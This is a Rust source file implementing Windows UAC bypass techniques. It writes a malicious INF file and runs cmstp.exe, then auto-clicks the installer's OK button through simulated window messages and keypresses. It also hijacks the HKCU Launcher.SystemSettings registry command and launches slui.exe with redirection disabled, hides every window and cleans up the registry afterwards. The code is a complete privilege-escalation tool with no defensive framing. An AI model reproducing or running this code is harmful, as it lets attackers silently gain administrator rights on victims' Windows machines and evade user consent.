#[cfg(target_os = "windows")]
mod fsr;
use winreg::enums;
use std::ffi::CString;
use std::fs::File;
use std::io::Write;
use std::process::{Command, Stdio};
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;

use winapi::um::winuser::{
    FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, BM_CLICK,
    SW_SHOWNORMAL,
};
use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
use winreg::RegKey;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;


/// Create/modify a registry value under HKCU
#[cfg(target_os = "windows")]
pub fn set_hkcu_value(
    path: &str,
    name: Option<&str>,
    value: Option<&str>,
    create: bool,
) -> std::io::Result<()> {
    let hkcu = RegKey::predef(winreg::enums::HKEY_CURRENT_USER);

    let key = if create {
        hkcu.create_subkey(path)?.0
    } else {
        hkcu.open_subkey_with_flags(path, enums::KEY_SET_VALUE)?
    };

    match (name, value) {
        (Some(n), Some(v)) => key.set_value(n, &v)?,
        (None, Some(v)) => key.set_value("", &v)?,
        (Some(n), None) => key.set_value(n, &"")?,
        (None, None) => key.set_value("", &"")?,
    }

    Ok(())
}

static INF_TEMPLATE: &str = r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"#;

/// Launch a program with WOW64 FS redirection disabled
#[cfg(target_os = "windows")]
pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
    let _guard = fsr::DisableFsRedirection::new();

    Command::new(program)
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;

    Ok(())
}

/// Generate INF file
pub fn generate_inf_file(command: &str) -> String {
    let temp_dir = "C:\\Windows\\Temp";
    let file = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());

    let data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);

    let mut f = File::create(&file).expect("Failed to create INF");
    f.write_all(data.as_bytes())
        .expect("Failed to write INF");

    file
}

/// Execute cmstp silently
fn execute_cmstp(inf_file: &str) {
    let binary = "C:\\Windows\\System32\\cmstp.exe";

    if !std::path::Path::new(binary).exists() {
        eprintln!("cmstp.exe not found");
        return;
    }

    let mut child = Command::new(binary)
        .arg("/au")
        .arg(inf_file)
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start cmstp");

    let titles = [
        "CorpVPN",
        "cmstp",
        "Connection Manager Profile Installer",
        "cmstp.exe",
    ];

    for t in &titles {
        if interact_with_window(t) {
            break;
        }
    }

    let _ = child.wait();
}

/// Click OK on cmstp window
fn interact_with_window(name: &str) -> bool {
    let class = CString::new(name).unwrap();

    loop {
        unsafe {
            let hwnd = FindWindowA(null_mut(), class.as_ptr());
            if hwnd.is_null() {
                continue;
            }

            SetForegroundWindow(hwnd);
            ShowWindow(hwnd, SW_SHOWNORMAL);

            let ok = FindWindowExA(
                hwnd,
                null_mut(),
                null_mut(),
                CString::new("OK").unwrap().as_ptr(),
            );

            SendMessageA(ok, BM_CLICK, 0, 0);
            simulate_keypress();

            return true;
        }
    }
}

/// Press ENTER
fn simulate_keypress() {
    unsafe {
        let mut input = INPUT {
            type_: INPUT_KEYBOARD,
            u: std::mem::zeroed(),
        };

        *input.u.ki_mut() = KEYBDINPUT {
            wVk: VK_RETURN as u16,
            wScan: 0,
            dwFlags: 0,
            time: 0,
            dwExtraInfo: 0,
        };

        SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
    }
}

/// Delete registry key
pub fn delete_hkcu_key(path: &str) -> std::io::Result<()> {
    let hkcu = RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    let _ = hkcu.delete_subkey_all(path);
    Ok(())
}

/// UAC via slui
pub fn uac_slui(payload: &String) {
    let path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";

    let _ = delete_hkcu_key(path);

    if let Err(_) = set_hkcu_value(path, None, Some(payload), true) {
        let _ = delete_hkcu_key(path);
        return;
    }

    if let Err(_) = set_hkcu_value(path, Some("DelegateExecute"), None, true) {
        let _ = delete_hkcu_key(path);
        return;
    }

    thread::sleep(Duration::from_secs(3));

    let slui_path = "C:\\Windows\\System32\\slui.exe";

    if let Err(_) = launch_with_fsr_disabled(slui_path) {
        let _ = delete_hkcu_key(path);
        return;
    }

    // Cleanup registry after slui has had time to process
    let cleanup_path = path.to_string();
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(5));
        let _ = delete_hkcu_key(&cleanup_path);
    });
}

/// Main UAC elevation entry
pub fn elevate_uac(command: &String) {
    // Kill existing cmstp silently
    let _ = Command::new("taskkill")
        .creation_flags(CREATE_NO_WINDOW)
        .args(&["/IM", "cmstp.exe", "/F"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();

    // ensure process is gone
    thread::sleep(Duration::from_secs(5));

    let inf = generate_inf_file(command);
    execute_cmstp(&inf);
}